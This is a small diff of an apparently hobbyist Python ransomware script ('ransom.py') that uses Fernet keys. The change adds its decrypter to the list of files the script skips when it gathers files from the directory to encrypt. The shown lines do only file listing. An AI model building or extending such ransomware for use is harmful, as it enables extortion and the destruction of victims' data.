@@ -7,7 +7,7 @@ from cryptography.fernet import Fernet
 files = []
 #dosya olan ve ransom olanı almasın
 for file in os.listdir():
-    if file == "ransom.py" or file == "generated.key":
+    if file == "ransom.py" or file == "generated.key" or file == "ransomdecrypter.py":
         continue
     if os.path.isfile(file):
         files.append(file)
